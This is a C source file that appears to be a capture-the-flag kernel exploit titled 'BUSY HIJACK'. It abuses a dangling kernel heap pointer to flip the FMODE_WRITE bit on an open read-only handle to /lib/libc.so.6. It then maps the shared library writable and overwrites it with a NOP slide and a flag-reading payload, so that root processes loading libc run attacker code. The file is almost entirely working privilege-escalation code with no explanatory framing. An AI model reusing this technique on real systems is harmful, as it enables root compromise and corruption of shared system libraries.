#include "libs/fmode.h"
#include "libs/pwn.h"
#include "libs/readflag.h"

#include <dirent.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <unistd.h>

/*******************************
 * BUSY HIJACK                 *
 *******************************/

#define FILE_SIZE 0x100
#define NOP_SLIDE_SIZE 0x50000

int main(int argc, char *argv[]) {
  void *ptr;
  int libc_fd;
  uint32_t leak[FILE_SIZE / sizeof(uint32_t)] = {0};
  char clear[FILE_SIZE] = {0};

  lstage("INIT");

  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);
  init();

  linfo("created dangeling ptrs");
  ptr = keap_malloc(FILE_SIZE, GFP_KERNEL);
  keap_write(ptr, clear, FILE_SIZE);
  keap_free(ptr);
  linfo("dangeling ptr: %p", ptr);

  libc_fd = SYSCHK(open("/lib/libc.so.6", O_RDONLY));

  keap_read(ptr, leak, FILE_SIZE);

#ifdef DEBUG
  print_hex((char *)leak, FILE_SIZE);
#endif

  linfo("corrupt /lib/libc.so.6 to make O_RDWR");
  // is predictable, but this increases successrate
  linfo("old fmode: 0x%4x", leak[5]);
  leak[5] |= FMODE_WRITE;
  linfo("new fmode: 0x%4x", leak[5]);

  keap_write(ptr + 0x14, leak + 5, 1);

  // mmap doesn't check if FMODE_CAN_WRITE is set
  void *libc_map = SYSCHK(mmap(0, NOP_SLIDE_SIZE + sizeof(readflag),
                               PROT_WRITE | PROT_READ, MAP_SHARED, libc_fd, 0));

  memset(libc_map, '\x90', NOP_SLIDE_SIZE);
  memcpy(libc_map + NOP_SLIDE_SIZE, readflag, sizeof(readflag));

  // leave into hijacked root process
  lstage("read flag:");
  return 0;
}
